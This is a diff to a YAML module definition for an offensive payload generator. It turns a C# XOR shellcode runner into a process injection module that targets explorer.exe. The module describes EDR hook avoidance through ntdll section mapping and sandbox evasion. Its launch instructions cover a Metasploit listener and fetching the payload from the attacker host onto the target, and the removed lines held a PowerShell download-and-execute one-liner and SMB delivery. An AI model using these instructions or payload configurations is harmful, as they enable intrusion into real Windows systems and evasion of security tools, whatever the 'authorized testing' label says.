@@ -1,32 +1,34 @@
 meta:
-  name: "C# Simple XOR Shellcode Runner"
-  category: "Shellcode Execution"
+  name: "XOR Sections Process Injection (C#)"
+  category: "Process Injection"
   description: |
-    Simple shellcode runner in C# with XOR encryption and sandbox evasion.
+    Advanced process injection using low-level ntdll APIs for memory-mapped shellcode execution.
     
     Features:
+    - NtCreateSection/NtMapViewOfSection for stealthy memory sharing
     - XOR encryption for basic obfuscation (key: 0xfa)
-    - Sleep-based sandbox detection (10 second delay)
-    - Direct shellcode execution via VirtualAlloc + CreateThread
-    - Minimal API footprint
+    - VirtualAllocExNuma sandbox evasion
+    - Targets explorer.exe process
+    - Avoids common EDR hooks on kernel32 APIs
     
-    This is a straightforward runner suitable for initial access or testing.
-    The sleep-based evasion helps bypass automated sandboxes that skip delays.
+    This technique creates a memory section object that is mapped into both
+    the current and target processes, allowing shellcode to be written locally
+    and executed remotely without using VirtualAllocEx/WriteProcessMemory.
     
     WARNING: For authorized security testing only!
 
-  effectiveness: medium
+  effectiveness: "high"
 
   mitre:
-    tactic: "TA0002 - Execution"
-    technique: "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"
+    tactic: "TA0005 - Defense Evasion"
+    technique: "T1055.012 - Process Injection: Process Hollowing"
 
   artifacts:
-    - "VirtualAlloc with PAGE_EXECUTE_READWRITE"
-    - "CreateThread API calls"
-    - "10-second sleep before execution"
-    - "XOR-decoded shellcode in memory"
-    - "Network connection to C2 server"
+    - "NtCreateSection API calls to ntdll.dll"
+    - "NtMapViewOfSection memory mapping"
+    - "CreateRemoteThread in explorer.exe"
+    - "RWX memory sections"
+    - "VirtualAllocExNuma sandbox checks"
 
 parameters:
   - name: "lhost"
@@ -50,7 +52,7 @@ parameters:
     type: "string"
     description: "Output executable filename"
     required: false
-    default: "runner.exe"
+    default: "injector.exe"
 
   - name: "output_path"
     type: "path"
@@ -86,12 +88,12 @@ preprocessing:
 
 output:
   type: "template"
-  template: "shellcode_runner/simple_runner.cs"
+  template: "process_injection/xor_sections_inject.cs"
   compile:
     enabled: true
     command: "mcs -out:{{ output_path }}/{{ output_file }} -platform:x64 -unsafe {{ source_file }}"
   launch_instructions: |
-    C# Simple XOR Shellcode Runner - Launch Instructions
+    C# XOR Sections Process Injection - Launch Instructions
 
     Step 1: Start Metasploit Listener
 
@@ -118,13 +120,9 @@ output:
     On target (PowerShell):
     Invoke-WebRequest -Uri "http://{{ lhost }}:8080/{{ output_file }}" -OutFile "{{ output_file }}"
 
-    Or using SMB:
-    impacket-smbserver share . -smb2support
-    On target: copy \\{{ lhost }}\share\{{ output_file }} {{ output_file }}
-
     Step 3: Execute on Target
 
-    Simply run the executable:
+    Simply run the executable (requires admin/SeDebugPrivilege):
     {{ output_file }}
 
     Or via PowerShell:
@@ -138,23 +136,19 @@ output:
 
     Notes:
 
-    - Encrypted with XOR key 0x{{ xor_key }} for basic AV evasion
-    - Includes 10-second sleep for sandbox evasion
-    - Uses VirtualAlloc with RWX permissions
-    - Executes shellcode in separate thread
-    - EXITFUNC=thread ensures clean exit
+    - Uses NtCreateSection/NtMapViewOfSection to avoid kernel32 hooks
+    - Encrypted with XOR key 0x{{ xor_key }}
+    - Includes VirtualAllocExNuma sandbox evasion
+    - Injects into explorer.exe (requires elevated privileges)
+    - Memory sections avoid common EDR detection of VirtualAllocEx/WriteProcessMemory
+    - Requires x64 Windows system
 
     Troubleshooting:
 
     - If no connection: Check firewall rules on attacker machine
     - If AV blocks: Consider additional obfuscation or packing
-    - Payload waits 10 seconds before execution (sandbox evasion)
-    - Requires x64 Windows system
-
-    Alternative Execution:
-
-    Run from memory (no file drop):
-    powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://{{ lhost }}:8080/loader.ps1')"
+    - Requires SeDebugPrivilege or admin rights to inject into explorer.exe
+    - Check that explorer.exe is running on target
 
     Cleanup:
 
